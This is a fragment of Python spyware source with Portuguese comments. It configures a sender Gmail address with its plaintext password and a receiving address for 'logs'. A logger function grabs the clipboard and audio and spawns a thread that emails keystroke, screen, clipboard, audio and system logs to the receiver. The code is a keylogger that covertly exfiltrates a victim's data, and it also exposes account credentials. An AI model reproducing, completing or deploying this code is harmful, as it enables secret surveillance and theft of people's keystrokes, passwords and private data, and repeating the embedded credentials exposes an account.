...
email_to_send = "difukayama2003@gmail.com"      # insira o email que ira mandar os logs
password_for_sender = "alexl12p2929"            # insira a senha do email que ira mandar os logs
email_to_receive = "vidanoreal003@gmail.com"    # insira o email para receber os logs
...
def logger(key):
    ...
    getClipBoard()
    audioLogger()
    threading.Thread(target=sendEmail, args=(infoLog, screenLog, clipboardLog, audioLog, keyLog)).start()
